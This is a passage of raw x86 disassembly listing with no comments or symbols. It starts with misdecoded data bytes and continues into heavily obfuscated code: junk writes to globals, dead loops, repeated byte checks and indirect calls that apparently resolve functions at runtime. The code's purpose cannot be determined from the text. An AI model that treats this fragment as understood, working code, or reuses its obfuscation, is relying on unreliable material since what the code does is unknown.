  41c0b5:	cmp    ah,BYTE PTR [ebp-0x8]
  41c0b8:	ins    BYTE PTR es:[edi],dx
  41c0b9:	bnd jb 0x41c0ba
  41c0bc:	and    ch,BYTE PTR [ebp-0x6f82920a]
  41c0c2:	(bad)  
  41c0c4:	jns    0x41c0cb
  41c0c6:	lods   eax,DWORD PTR ds:[esi]
  41c0c7:	inc    ecx
  41c0c8:	cmp    bl,BYTE PTR [ebp+0x9f8e258]
  41c0ce:	(bad)  
  41c0cf:	scas   eax,DWORD PTR es:[edi]
  41c0d0:	xchg   ecx,eax
  41c0d1:	cmp    al,0xb7
  41c0d3:	jg     0x41c085
  41c0d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0d6:	sbb    eax,0x1f502cd3
  41c0db:	inc    esp
  41c0dc:	sub    eax,0x75c50b43
  41c0e1:	push   ss
  41c0e2:	sub    eax,0x5259daa7
  41c0e7:	mov    cs,eax
  41c0e9:	sub    eax,0xc66f52d6
  41c0ee:	imul   esp,DWORD PTR [eax-0x26],0xc4e15a13
  41c0f5:	push   esp
  41c0f6:	dec    edx
  41c0f7:	pop    edx
  41c0f8:	and    eax,0xbbb92c5e
  41c0fd:	sub    BYTE PTR [ebx-0x5fc17b3],cl
  41c103:	cmp    ecx,edi
  41c105:	je     0x41c147
  41c10b:	mov    ecx,DWORD PTR [ebp-0x18]
  41c10e:	add    ecx,eax
  41c110:	mov    DWORD PTR [ebp-0x1c],ecx
  41c113:	mov    ecx,DWORD PTR [ebp-0x30]
  41c116:	mov    edx,DWORD PTR [ebp-0x2c]
  41c119:	mov    edx,0xa147
  41c11e:	xor    cx,dx
  41c121:	mov    edx,DWORD PTR [ebp-0x1c]
  41c124:	mov    edx,DWORD PTR [edx+0xc]
  41c127:	add    cx,si
  41c12a:	cmp    WORD PTR [eax+edx*1],cx
  41c12e:	jne    0x41c147
  41c134:	mov    ecx,DWORD PTR ds:0x4262c9
  41c13a:	mov    ecx,DWORD PTR [ecx+0x198]
  41c140:	mov    DWORD PTR [ecx],eax
  41c142:	jmp    0x41c1c5
  41c147:	push   DWORD PTR [ebp+0x1c]
  41c14a:	push   DWORD PTR [ebp+0x18]
  41c14d:	jmp    0x41c1b4
  41c152:	mov    eax,DWORD PTR [ebp+0x18]
  41c155:	mov    ecx,DWORD PTR [ebp+0x1c]
  41c158:	cmp    eax,0x70941f9e
  41c15d:	jne    0x41c176
  41c163:	cmp    ecx,ebx
  41c165:	jne    0x41c176
  41c16b:	push   ebx
  41c16c:	push   0x70941f9b
  41c171:	jmp    0x41c1b4
  41c176:	mov    ecx,DWORD PTR [ebp+0x18]
  41c179:	mov    edx,DWORD PTR [ebp+0x1c]
  41c17c:	mov    eax,0x70941f98
  41c181:	cmp    ecx,eax
  41c183:	jne    0x41c198
  41c189:	cmp    edx,ebx
  41c18b:	jne    0x41c198
  41c191:	push   ebx
  41c192:	push   edi
  41c193:	jmp    0x41c1b4
  41c198:	mov    ecx,DWORD PTR [ebp+0x18]
  41c19b:	mov    edx,DWORD PTR [ebp+0x1c]
  41c19e:	cmp    ecx,0x70941f9b
  41c1a4:	jne    0x41c1c5
  41c1aa:	cmp    edx,ebx
  41c1ac:	jne    0x41c1c5
  41c1b2:	push   ebx
  41c1b3:	push   eax
  41c1b4:	push   DWORD PTR [ebp+0x14]
  41c1b7:	push   DWORD PTR [ebp+0x10]
  41c1ba:	push   DWORD PTR [ebp+0xc]
  41c1bd:	push   DWORD PTR [ebp+0x8]
  41c1c0:	call   0x417355
  41c1c5:	pop    edi
  41c1c6:	pop    esi
  41c1c7:	pop    ebx
  41c1c8:	leave  
  41c1c9:	ret    0x18
  41c1cc:	push   ebp
  41c1cd:	mov    ebp,esp
  41c1cf:	and    esp,0xfffffff8
  41c1d2:	add    DWORD PTR ds:0x426f09,0x426ef5
  41c1dc:	mov    al,ds:0x4263ef
  41c1e1:	sub    esp,0x54
  41c1e4:	mov    DWORD PTR ds:0x426eb5,0x2e24
  41c1ee:	push   ebx
  41c1ef:	push   esi
  41c1f0:	push   edi
  41c1f1:	mov    DWORD PTR ds:0x426f15,0x7495
  41c1fb:	cmp    al,BYTE PTR ds:0x4263fa
  41c201:	mov    DWORD PTR ds:0x426ee9,0x194c
  41c20b:	je     0x41c22c
  41c211:	or     DWORD PTR ds:0x426eed,0x426ed5
  41c21b:	xor    eax,eax
  41c21d:	mov    DWORD PTR ds:0x426ee1,0xaaa
  41c227:	jmp    0x41d276
  41c22c:	mov    al,ds:0x42640c
  41c231:	cmp    al,BYTE PTR ds:0x42641b
  41c237:	mov    DWORD PTR ds:0x426ee9,0x1f8d
  41c241:	jne    0x41c211
  41c247:	neg    edi
  41c249:	mov    edi,DWORD PTR ds:0x430a50
  41c24f:	and    DWORD PTR ds:0x426ee1,0x426e95
  41c259:	push   0x426425
  41c25e:	sbb    DWORD PTR ds:0x426f0d,0x426ed5
  41c268:	push   0x426435
  41c26d:	adc    DWORD PTR ds:0x426eed,0x426ed5
  41c277:	call   edi
  41c279:	test   eax,eax
  41c27b:	mov    DWORD PTR ds:0x426ee5,0x502f
  41c285:	je     0x41c211
  41c28b:	push   0x426449
  41c290:	and    DWORD PTR ds:0x426f1d,0x426ef1
  41c29a:	call   DWORD PTR ds:0x430a34
  41c2a0:	mov    DWORD PTR [esp+0x44],0x0
  41c2a8:	mov    ecx,0xf89c85b5
  41c2ad:	mov    DWORD PTR [esp+0x10],ecx
  41c2b1:	mov    DWORD PTR ds:0x426edd,0x1a
  41c2bb:	cmp    DWORD PTR ds:0x426edd,0x0
  41c2c2:	je     0x41c31b
  41c2c8:	cmp    DWORD PTR ds:0x426edd,0x7
  41c2cf:	jle    0x41c31b
  41c2d5:	jmp    0x41c2ed
  41c2da:	push   DWORD PTR [ebp-0x20]
  41c2dd:	push   0x4e76
  41c2e2:	push   0x4592
  41c2e7:	call   DWORD PTR ds:0x430a18
  41c2ed:	cmp    DWORD PTR ds:0x426edd,0x8
  41c2f4:	jne    0x41c309
  41c2fa:	xor    edx,edx
  41c2fc:	add    edx,DWORD PTR ds:0x426edd
  41c302:	dec    edx
  41c303:	mov    DWORD PTR ds:0x426edd,edx
  41c309:	mov    edx,DWORD PTR ds:0x426edd
  41c30f:	dec    edx
  41c310:	mov    DWORD PTR ds:0x426edd,edx
  41c316:	jmp    0x41c2bb
  41c31b:	mov    DWORD PTR [esp+0x1c],0xf89c85b4
  41c323:	lea    eax,[esp+0x34]
  41c327:	mov    DWORD PTR [esp+0x44],eax
  41c32b:	mov    esi,DWORD PTR ds:0x428d05
  41c331:	mov    ebx,DWORD PTR ds:0x42af59
  41c337:	sub    esi,ebx
  41c339:	sub    esi,DWORD PTR [esi+ebx*1]
  41c33c:	lea    eax,[esp+0x30]
  41c340:	mov    DWORD PTR [esp+0x28],eax
  41c344:	sub    DWORD PTR ds:0x426ea9,0x492f
  41c34e:	mov    eax,ds:0x4262c9
  41c353:	mov    edx,DWORD PTR ds:0x426ef9
  41c359:	sbb    DWORD PTR ds:0x426f05,edx
  41c35f:	mov    eax,DWORD PTR [eax+0x1c8]
  41c365:	mov    DWORD PTR ds:0x426f29,0x788d
  41c36f:	mov    eax,DWORD PTR [eax]
  41c371:	mov    edx,DWORD PTR [esp+0x28]
  41c375:	and    DWORD PTR ds:0x426efd,0x0
  41c37f:	jmp    0x41c393
  41c384:	xor    esi,esi
  41c386:	xor    esi,DWORD PTR ds:0x426efd
  41c38c:	inc    esi
  41c38d:	mov    DWORD PTR ds:0x426efd,esi
  41c393:	cmp    DWORD PTR ds:0x426efd,0x1a
  41c39a:	jae    0x41c3cb
  41c3a0:	cmp    DWORD PTR ds:0x426efd,0x1c
  41c3a7:	jge    0x41c3cb
  41c3ad:	jmp    0x41c3c6
  41c3b2:	push   DWORD PTR [ebp-0xc]
  41c3b5:	push   0x4c83
  41c3ba:	push   DWORD PTR [ebp-0x14]
  41c3bd:	push   DWORD PTR [ebp-0x1c]
  41c3c0:	call   DWORD PTR ds:0x430a4c
  41c3c6:	jmp    0x41c384
  41c3cb:	mov    esi,0x75108b3
  41c3d0:	and    DWORD PTR ds:0x426e81,0x1564
  41c3da:	xor    eax,esi
  41c3dc:	mov    ebx,0x3272fa
  41c3e1:	add    eax,ebx
  41c3e3:	mov    DWORD PTR [edx],eax
  41c3e5:	mov    DWORD PTR ds:0x426ea1,0x7a67
  41c3ef:	mov    eax,ds:0x426d99
  41c3f4:	mov    DWORD PTR ds:0x426f1d,0x65da
  41c3fe:	cmp    eax,0x455dedfa
  41c403:	mov    DWORD PTR ds:0x426ea9,0x55fc
  41c40d:	jne    0x41c4f5
  41c413:	and    DWORD PTR ds:0x426ef5,0x0
  41c41d:	mov    eax,ds:0x426ef5
  41c422:	inc    eax
  41c423:	mov    ds:0x426ef5,eax
  41c428:	cmp    DWORD PTR ds:0x426ef5,0xd
  41c42f:	jl     0x41c479
  41c435:	jmp    0x41c454
  41c43a:	push   0x59de
  41c43f:	push   0x39ed
  41c444:	push   0x1b7c
  41c449:	push   0x44aa
  41c44e:	call   DWORD PTR ds:0x430a1c
  41c454:	cmp    DWORD PTR ds:0x426ef5,0xc
  41c45b:	jne    0x41c46c
  41c461:	mov    eax,ds:0x426ef5
  41c466:	inc    eax
  41c467:	mov    ds:0x426ef5,eax
  41c46c:	cmp    DWORD PTR ds:0x426ef5,0x1f
  41c473:	jb     0x41c41d
  41c479:	mov    eax,DWORD PTR [esp+0x10]
  41c47d:	xor    edx,DWORD PTR ds:0x426ecd
  41c483:	mov    edx,DWORD PTR ds:0x4262c9
  41c489:	mov    edx,DWORD PTR [edx+0x198]
  41c48f:	add    DWORD PTR ds:0x426ec5,0x6b2
  41c499:	xor    eax,esi
  41c49b:	adc    DWORD PTR ds:0x426f25,0x426ef9
  41c4a5:	add    eax,ebx
  41c4a7:	and    DWORD PTR ds:0x426e85,0x426f15
  41c4b1:	mov    DWORD PTR [edx],eax
  41c4b3:	mov    eax,DWORD PTR [esp+0x10]
  41c4b7:	sub    DWORD PTR ds:0x426ec9,0x4e94
  41c4c1:	xor    eax,esi
  41c4c3:	add    eax,ebx
  41c4c5:	adc    DWORD PTR ds:0x426e81,0x426e91
  41c4cf:	mov    ds:0x426d99,eax
  41c4d4:	mov    eax,DWORD PTR [esp+0x10]
  41c4d8:	adc    DWORD PTR ds:0x426eed,0x426ef9
  41c4e2:	xor    eax,esi
  41c4e4:	add    eax,ebx
  41c4e6:	sub    DWORD PTR ds:0x426ea9,0x426e85
  41c4f0:	mov    ds:0x4263c1,eax
  41c4f5:	mov    eax,ds:0x4262c9
  41c4fa:	sbb    DWORD PTR ds:0x426f05,0x67a3
  41c504:	mov    eax,DWORD PTR [eax+0x18c]
  41c50a:	adc    DWORD PTR ds:0x426e91,0x180f
  41c514:	mov    eax,DWORD PTR [eax]
  41c516:	sbb    DWORD PTR ds:0x426eb1,0x4112
  41c520:	mov    DWORD PTR [esp+0x48],eax
  41c524:	adc    DWORD PTR ds:0x426eb9,edi
  41c52a:	mov    eax,0xf89c85b9
  41c52f:	mov    DWORD PTR [esp+0x38],eax
  41c533:	inc    DWORD PTR ds:0x426e8d
  41c539:	mov    DWORD PTR [esp+0x38],eax
  41c53d:	xor    DWORD PTR ds:0x426f11,0x441e
  41c547:	mov    DWORD PTR [esp+0x38],eax
  41c54b:	mov    DWORD PTR [esp+0x38],ecx
  41c54f:	neg    DWORD PTR ds:0x426f25
  41c555:	mov    DWORD PTR [esp+0x28],eax
  41c559:	movzx  eax,WORD PTR ds:0x426ec5
  41c560:	sbb    eax,DWORD PTR ds:0x426ee1
  41c566:	mov    ds:0x426ec5,eax
  41c56b:	mov    DWORD PTR [esp+0x28],0xf89c85bd
  41c573:	sbb    DWORD PTR ds:0x426ef9,0x58a6
  41c57d:	mov    eax,DWORD PTR [esp+0x10]
  41c581:	xor    eax,esi
  41c583:	add    eax,ebx
  41c585:	jmp    0x41c7a3
  41c58a:	mov    DWORD PTR ds:0x426eb5,0x6384
  41c594:	mov    al,ds:0x42647f
  41c599:	mov    DWORD PTR ds:0x426f01,0x6aa0
  41c5a3:	cmp    al,BYTE PTR ds:0x42648a
  41c5a9:	mov    DWORD PTR ds:0x426e85,0x34fb
  41c5b3:	jne    0x41c211
  41c5b9:	mov    DWORD PTR ds:0x426e99,0x7ac4
  41c5c3:	mov    al,ds:0x42649c
  41c5c8:	cmp    al,BYTE PTR ds:0x4264ab
  41c5ce:	mov    DWORD PTR ds:0x426e99,0x679f
  41c5d8:	jne    0x41c211
  41c5de:	push   0x4264b5
  41c5e3:	or     DWORD PTR ds:0x426e99,0x4d97
  41c5ed:	push   0x4264c5
  41c5f2:	call   edi
  41c5f4:	test   eax,eax
  41c5f6:	mov    DWORD PTR ds:0x426ecd,0x4160
  41c600:	je     0x41c211
  41c606:	mov    DWORD PTR ds:0x426ec5,0x29ef
  41c610:	mov    al,ds:0x4264db
  41c615:	cmp    al,BYTE PTR ds:0x4264e6
  41c61b:	jne    0x41c211
  41c621:	mov    al,ds:0x4264f8
  41c626:	mov    DWORD PTR ds:0x426ecd,0x6d7c
  41c630:	cmp    al,BYTE PTR ds:0x426507
  41c636:	mov    DWORD PTR ds:0x426ee5,0x7eb8
  41c640:	jne    0x41c211
  41c646:	sub    DWORD PTR ds:0x426ef9,0x282b
  41c650:	push   0x426511
  41c655:	push   0x426521
  41c65a:	call   edi
  41c65c:	sbb    DWORD PTR ds:0x426edd,0x426e9d
  41c666:	test   eax,eax
  41c668:	mov    DWORD PTR ds:0x426ee9,0x3f4b
  41c672:	je     0x41c211
  41c678:	and    DWORD PTR ds:0x426e91,0x0
  41c682:	xor    eax,eax
  41c684:	xor    eax,DWORD PTR ds:0x426e91
  41c68a:	inc    eax
  41c68b:	mov    ds:0x426e91,eax
  41c690:	cmp    DWORD PTR ds:0x426e91,0x9
  41c697:	ja     0x41c6d0
  41c69d:	jmp    0x41c6a8
  41c6a2:	call   DWORD PTR ds:0x430a20
  41c6a8:	cmp    DWORD PTR ds:0x426e91,0x8
  41c6af:	jne    0x41c6c3
  41c6b5:	xor    eax,eax
  41c6b7:	add    eax,DWORD PTR ds:0x426e91
  41c6bd:	inc    eax
  41c6be:	mov    ds:0x426e91,eax
  41c6c3:	cmp    DWORD PTR ds:0x426e91,0x1a
  41c6ca:	jb     0x41c682
  41c6d0:	mov    eax,DWORD PTR [esp+0x1c]
  41c6d4:	adc    DWORD PTR ds:0x426f01,ecx
  41c6da:	mov    ecx,DWORD PTR [esp+0x28]
  41c6de:	xor    eax,esi
  41c6e0:	lea    eax,[eax+ecx*1+0x3272fa]
  41c6e7:	push   eax
  41c6e8:	xor    eax,DWORD PTR ds:0x426eb1
  41c6ee:	mov    eax,DWORD PTR [esp+0x3c]
  41c6f2:	adc    DWORD PTR ds:0x426ec1,0x19c6
  41c6fc:	xor    eax,esi
  41c6fe:	sbb    DWORD PTR ds:0x426ec5,0x426ea9
  41c708:	lea    eax,[ebp+eax*1+0x327302]
  41c70f:	xor    DWORD PTR ds:0x426ec1,0x34b0
  41c719:	push   eax
  41c71a:	xor    eax,DWORD PTR ds:0x426e99
  41c720:	mov    eax,ds:0x4262c9
  41c725:	adc    DWORD PTR ds:0x426ea5,0x426f09
  41c72f:	push   DWORD PTR [eax+0x1bc]
  41c735:	adc    DWORD PTR ds:0x426f0d,0x426ea5
  41c73f:	call   0x41d27f
  41c744:	mov    eax,DWORD PTR [esp+0x1c]
  41c748:	mov    ecx,DWORD PTR [esp+0x28]
  41c74c:	xor    eax,esi
  41c74e:	and    DWORD PTR ds:0x426e85,0x0
  41c758:	mov    edx,DWORD PTR ds:0x426e85
  41c75e:	inc    edx
  41c75f:	mov    DWORD PTR ds:0x426e85,edx
  41c765:	cmp    DWORD PTR ds:0x426e85,0x22
  41c76c:	jl     0x41c79c
  41c772:	jmp    0x41c78f
  41c777:	push   0x426000
  41c77c:	push   0x29cf
  41c781:	push   0x6715
  41c786:	push   DWORD PTR [ebp-0x18]
  41c789:	call   DWORD PTR ds:0x430a24
  41c78f:	cmp    DWORD PTR ds:0x426e85,0x1b
  41c796:	jb     0x41c758
  41c79c:	lea    eax,[ecx+eax*1+0x3272fa]
  41c7a3:	mov    ecx,DWORD PTR [esp+0x1c]
  41c7a7:	mov    edx,DWORD PTR [esp+0x1c]
  41c7ab:	xor    edx,esi
  41c7ad:	sbb    DWORD PTR ds:0x426f29,0x426e8d
  41c7b7:	xor    ecx,esi
  41c7b9:	add    ecx,edx
  41c7bb:	sbb    edx,DWORD PTR ds:0x426f1d
  41c7c1:	mov    edx,DWORD PTR [esp+0x1c]
  41c7c5:	adc    DWORD PTR ds:0x426ef9,0x135a
  41c7cf:	xor    edx,esi
  41c7d1:	mov    DWORD PTR ds:0x426ee5,0x2979
  41c7db:	lea    ecx,[ecx+edx*1+0x9758ee]
  41c7e2:	mov    DWORD PTR ds:0x426f2d,0x689
  41c7ec:	mov    DWORD PTR [esp+0x28],eax
  41c7f0:	cmp    eax,ecx
  41c7f2:	mov    DWORD PTR ds:0x426efd,0x13db
  41c7fc:	jbe    0x41c58a
  41c802:	mov    eax,DWORD PTR [ebp+0xc]
  41c805:	mov    ds:0x42614d,eax
  41c80a:	and    DWORD PTR ds:0x426eb1,0x0
  41c814:	jmp    0x41c824
  41c819:	mov    eax,ds:0x426eb1
  41c81e:	inc    eax
  41c81f:	mov    ds:0x426eb1,eax
  41c824:	cmp    DWORD PTR ds:0x426eb1,0x19
  41c82b:	jae    0x41c851
  41c831:	cmp    DWORD PTR ds:0x426eb1,0x20
  41c838:	jl     0x41c851
  41c83e:	jmp    0x41c84c
  41c843:	push   DWORD PTR [ebp-0xc]
  41c846:	call   DWORD PTR ds:0x430a28
  41c84c:	jmp    0x41c819
  41c851:	mov    eax,DWORD PTR [ebp+0x10]
  41c854:	mov    ds:0x4263a9,eax
  41c859:	mov    ecx,DWORD PTR ds:0x42af61
  41c85f:	mov    eax,ds:0x42af6d
  41c864:	sub    eax,ecx
  41c866:	xor    ecx,DWORD PTR [ecx+eax*1]
  41c869:	mov    eax,ds:0x42614d
  41c86e:	inc    ecx
  41c86f:	mov    ecx,DWORD PTR [esp+0x44]
  41c873:	sbb    DWORD PTR ds:0x426f0d,0x426ed5
  41c87d:	sub    eax,ebx
  41c87f:	sub    DWORD PTR ds:0x426eed,0x426f05
  41c889:	xor    eax,esi
  41c88b:	mov    DWORD PTR [ecx],eax
  41c88d:	mov    DWORD PTR ds:0x426ea1,0x1d16
  41c897:	lea    eax,[esp+0x20]
  41c89b:	mov    DWORD PTR ds:0x426f1d,0x743e
  41c8a5:	mov    DWORD PTR [esp+0x4c],eax
  41c8a9:	mov    DWORD PTR ds:0x426eb5,0x1725
  41c8b3:	lea    eax,[ebp+0x4]
  41c8b6:	mov    DWORD PTR ds:0x426f0d,0x331f
  41c8c0:	mov    DWORD PTR [esp+0x20],eax
  41c8c4:	mov    DWORD PTR ds:0x426ea1,0x4fd1
  41c8ce:	mov    al,ds:0x426537
  41c8d3:	cmp    al,BYTE PTR ds:0x426542
  41c8d9:	jne    0x41c211
  41c8df:	mov    al,ds:0x426554
  41c8e4:	mov    DWORD PTR ds:0x426e99,0x22c3
  41c8ee:	cmp    al,BYTE PTR ds:0x426563
  41c8f4:	mov    DWORD PTR ds:0x426f21,0x5c30
  41c8fe:	jne    0x41c211
  41c904:	sub    DWORD PTR ds:0x426eb5,0x53da
  41c90e:	push   0x42656d
  41c913:	sbb    DWORD PTR ds:0x426f0d,0x426f15
  41c91d:	push   0x42657d
  41c922:	sbb    DWORD PTR ds:0x426e81,0x426e95
  41c92c:	call   edi
  41c92e:	test   eax,eax
  41c930:	mov    DWORD PTR ds:0x426f09,0x3f7d
  41c93a:	je     0x41c211
  41c940:	mov    al,ds:0x426593
  41c945:	mov    DWORD PTR ds:0x426f09,0x7a71
  41c94f:	cmp    al,BYTE PTR ds:0x42659e
  41c955:	mov    DWORD PTR ds:0x426f21,0x448e
  41c95f:	jne    0x41c211
  41c965:	mov    al,ds:0x4265b0
  41c96a:	cmp    al,BYTE PTR ds:0x4265bf
  41c970:	jne    0x41c211
  41c976:	push   0x4265c9
  41c97b:	add    DWORD PTR ds:0x426eb9,0x4508
  41c985:	push   0x4265d9
  41c98a:	call   edi
  41c98c:	test   eax,eax
  41c98e:	je     0x41c211
  41c994:	mov    DWORD PTR ds:0x426ed1,0x4635
  41c99e:	mov    al,ds:0x4265ef
  41c9a3:	mov    DWORD PTR ds:0x426f11,0x2d29
  41c9ad:	cmp    al,BYTE PTR ds:0x4265fa
  41c9b3:	mov    DWORD PTR ds:0x426f1d,0x5285
  41c9bd:	jne    0x41c211
  41c9c3:	mov    DWORD PTR ds:0x426ecd,0x17c5
  41c9cd:	mov    al,ds:0x42660c
  41c9d2:	mov    DWORD PTR ds:0x426ecd,0x1f4b
  41c9dc:	cmp    al,BYTE PTR ds:0x42661b
  41c9e2:	jne    0x41c211
  41c9e8:	push   0x426625
  41c9ed:	adc    DWORD PTR ds:0x426ef1,0x426ee5
  41c9f7:	push   0x426635
  41c9fc:	call   edi
  41c9fe:	adc    DWORD PTR ds:0x426edd,0x72d
  41ca08:	test   eax,eax
  41ca0a:	je     0x41c211
  41ca10:	mov    DWORD PTR ds:0x426ed9,0x3296
  41ca1a:	mov    al,ds:0x42664b
  41ca1f:	mov    DWORD PTR ds:0x426e91,0x9e5
  41ca29:	cmp    al,BYTE PTR ds:0x426656
  41ca2f:	mov    DWORD PTR ds:0x426ee1,0x4731
  41ca39:	jne    0x41c211
  41ca3f:	mov    al,ds:0x426668
  41ca44:	cmp    al,BYTE PTR ds:0x426677
  41ca4a:	jne    0x41c211
  41ca50:	xor    DWORD PTR ds:0x426e85,0x78df
  41ca5a:	push   0x426681
  41ca5f:	push   0x426691
  41ca64:	call   edi
  41ca66:	test   eax,eax
  41ca68:	je     0x41c211
  41ca6e:	mov    DWORD PTR ds:0x426efd,0x48d1
  41ca78:	mov    al,ds:0x4266a7
  41ca7d:	mov    DWORD PTR ds:0x426eb1,0x58ba
  41ca87:	cmp    al,BYTE PTR ds:0x4266b2
  41ca8d:	jne    0x41c211
  41ca93:	mov    al,ds:0x4266c4
  41ca98:	mov    DWORD PTR ds:0x426ea9,0x5172
  41caa2:	cmp    al,BYTE PTR ds:0x4266d3
  41caa8:	mov    DWORD PTR ds:0x426ecd,0x25dc
  41cab2:	jne    0x41c211
  41cab8:	add    DWORD PTR ds:0x426ef5,0x426ea9
  41cac2:	push   0x4266dd
  41cac7:	mov    DWORD PTR ds:0x426f1d,0x534b
  41cad1:	push   0x4266ed
  41cad6:	xor    DWORD PTR ds:0x426e8d,0x426e89
  41cae0:	call   edi
  41cae2:	test   eax,eax
  41cae4:	mov    DWORD PTR ds:0x426f09,0x17e9
  41caee:	je     0x41c211
  41caf4:	mov    DWORD PTR ds:0x426f15,0x546d
  41cafe:	mov    al,ds:0x426703
  41cb03:	mov    DWORD PTR ds:0x426ec9,0x6884
  41cb0d:	cmp    al,BYTE PTR ds:0x42670e
  41cb13:	mov    DWORD PTR ds:0x426e95,0x724e
  41cb1d:	jne    0x41c211
  41cb23:	mov    DWORD PTR ds:0x426eb1,0x7b3e
  41cb2d:	mov    al,ds:0x426720
  41cb32:	mov    DWORD PTR ds:0x426ea9,0xb8a
  41cb3c:	cmp    al,BYTE PTR ds:0x42672f
  41cb42:	mov    DWORD PTR ds:0x426ea5,0xfff
  41cb4c:	jne    0x41c211
  41cb52:	adc    DWORD PTR ds:0x426e81,0x426ed5
  41cb5c:	push   0x426739
  41cb61:	push   0x426749
  41cb66:	call   edi
  41cb68:	mov    DWORD PTR ds:0x426eb1,0x513e
  41cb72:	test   eax,eax
  41cb74:	je     0x41c211
  41cb7a:	mov    al,ds:0x42675f
  41cb7f:	mov    DWORD PTR ds:0x426e8d,0x24d0
  41cb89:	cmp    al,BYTE PTR ds:0x42676a
  41cb8f:	jne    0x41c211
  41cb95:	mov    DWORD PTR ds:0x426eb1,0x7a1a
  41cb9f:	mov    al,ds:0x42677c
  41cba4:	mov    DWORD PTR ds:0x426ef5,0x1244
  41cbae:	cmp    al,BYTE PTR ds:0x42678b
  41cbb4:	mov    DWORD PTR ds:0x426ed1,0x3050
  41cbbe:	jne    0x41c211
  41cbc4:	sub    DWORD PTR ds:0x426ee1,0x426f25
  41cbce:	push   0x426795
  41cbd3:	add    DWORD PTR ds:0x426f11,0x40a8
  41cbdd:	push   0x4267a5
  41cbe2:	sub    DWORD PTR ds:0x426ef9,0x426e9d
  41cbec:	call   edi
  41cbee:	adc    DWORD PTR ds:0x426e99,0x426f0d
  41cbf8:	test   eax,eax
  41cbfa:	je     0x41c211
  41cc00:	mov    al,ds:0x4267bb
  41cc05:	mov    DWORD PTR ds:0x426f05,0xc7b
  41cc0f:	cmp    al,BYTE PTR ds:0x4267c6
  41cc15:	mov    DWORD PTR ds:0x426eb9,0x70f1
  41cc1f:	jne    0x41c211
  41cc25:	mov    al,ds:0x4267d8
  41cc2a:	mov    DWORD PTR ds:0x426f09,0x320
  41cc34:	cmp    al,BYTE PTR ds:0x4267e7
  41cc3a:	mov    DWORD PTR ds:0x426ee1,0xc80
  41cc44:	jne    0x41c211
  41cc4a:	sbb    DWORD PTR ds:0x426e85,0x426ea9
  41cc54:	push   0x4267f1
  41cc59:	adc    DWORD PTR ds:0x426f21,0x426f09
  41cc63:	push   0x426801
  41cc68:	call   edi
  41cc6a:	test   eax,eax
  41cc6c:	mov    DWORD PTR ds:0x426e9d,0x1d82
  41cc76:	je     0x41c211
  41cc7c:	mov    DWORD PTR ds:0x426e8d,0x4c1f
  41cc86:	mov    al,ds:0x426817
  41cc8b:	mov    DWORD PTR ds:0x426ebd,0x2305
  41cc95:	cmp    al,BYTE PTR ds:0x426822
  41cc9b:	mov    DWORD PTR ds:0x426e85,0x52ee
  41cca5:	jne    0x41c211
  41ccab:	mov    DWORD PTR ds:0x426eed,0x1308
  41ccb5:	mov    al,ds:0x426834
  41ccba:	cmp    al,BYTE PTR ds:0x426843
  41ccc0:	mov    DWORD PTR ds:0x426ea9,0x1ac4
  41ccca:	jne    0x41c211
  41ccd0:	push   0x42684d
  41ccd5:	push   0x42685d
  41ccda:	call   edi
  41ccdc:	xor    DWORD PTR ds:0x426eb5,0x537b
  41cce6:	test   eax,eax
  41cce8:	mov    DWORD PTR ds:0x426f2d,0x4412
  41ccf2:	je     0x41c211
  41ccf8:	mov    al,ds:0x426873
  41ccfd:	mov    DWORD PTR ds:0x426eb1,0x52c5
  41cd07:	cmp    al,BYTE PTR ds:0x42687e
  41cd0d:	mov    DWORD PTR ds:0x426f01,0x16df
  41cd17:	jne    0x41c211
  41cd1d:	mov    DWORD PTR ds:0x426ee1,0xd56
  41cd27:	mov    al,ds:0x426890
  41cd2c:	mov    DWORD PTR ds:0x426ed1,0x624d
  41cd36:	cmp    al,BYTE PTR ds:0x42689f
  41cd3c:	mov    DWORD PTR ds:0x426e95,0x6fa7
  41cd46:	jne    0x41c211
  41cd4c:	push   0x4268a9
  41cd51:	push   0x4268b9
  41cd56:	call   edi
  41cd58:	test   eax,eax
  41cd5a:	je     0x41c211
  41cd60:	mov    al,ds:0x4268cf
  41cd65:	mov    DWORD PTR ds:0x426ea5,0x6b61
  41cd6f:	cmp    al,BYTE PTR ds:0x4268da
  41cd75:	mov    DWORD PTR ds:0x426ef1,0x607d
  41cd7f:	jne    0x41c211
  41cd85:	mov    al,ds:0x4268ec
  41cd8a:	mov    DWORD PTR ds:0x426f11,0x76ce
  41cd94:	cmp    al,BYTE PTR ds:0x4268fb
  41cd9a:	mov    DWORD PTR ds:0x426ea9,0x7be9
  41cda4:	jne    0x41c211
  41cdaa:	push   0x426905
  41cdaf:	xor    DWORD PTR ds:0x426e89,0x5d69
  41cdb9:	push   0x426915
  41cdbe:	call   edi
  41cdc0:	test   eax,eax
  41cdc2:	je     0x41c211
  41cdc8:	mov    al,ds:0x42692b
  41cdcd:	mov    DWORD PTR ds:0x426eed,0x2af5
  41cdd7:	cmp    al,BYTE PTR ds:0x426936
  41cddd:	mov    DWORD PTR ds:0x426ed9,0x56c9
  41cde7:	jne    0x41c211
  41cded:	mov    DWORD PTR ds:0x426f09,0x21f5
  41cdf7:	mov    al,ds:0x426948
  41cdfc:	cmp    al,BYTE PTR ds:0x426957
  41ce02:	jne    0x41c211
  41ce08:	push   0x426961
  41ce0d:	sub    DWORD PTR ds:0x426ef1,0x426f19
  41ce17:	push   0x426971
  41ce1c:	call   edi
  41ce1e:	or     DWORD PTR ds:0x426f11,0x426ea1
  41ce28:	test   eax,eax
  41ce2a:	je     0x41c211
  41ce30:	mov    DWORD PTR ds:0x426f1d,0x33c9
  41ce3a:	mov    al,ds:0x426987
  41ce3f:	cmp    al,BYTE PTR ds:0x426992
  41ce45:	jne    0x41c211
  41ce4b:	mov    al,ds:0x4269a4
  41ce50:	cmp    al,BYTE PTR ds:0x4269b3
  41ce56:	jne    0x41c211
  41ce5c:	push   0x4269bd
  41ce61:	push   0x4269cd
  41ce66:	call   edi
  41ce68:	test   eax,eax
  41ce6a:	je     0x41c211
  41ce70:	mov    al,ds:0x4269e3
  41ce75:	cmp    al,BYTE PTR ds:0x4269ee
  41ce7b:	jne    0x41c211
  41ce81:	mov    al,ds:0x426a00
  41ce86:	cmp    al,BYTE PTR ds:0x426a0f
  41ce8c:	jne    0x41c211
  41ce92:	push   0x426a19
  41ce97:	push   0x426a29
  41ce9c:	call   edi
  41ce9e:	test   eax,eax
  41cea0:	je     0x41c211
  41cea6:	mov    al,ds:0x426a3f
  41ceab:	cmp    al,BYTE PTR ds:0x426a4a
  41ceb1:	jne    0x41c211
  41ceb7:	mov    al,ds:0x426a5c
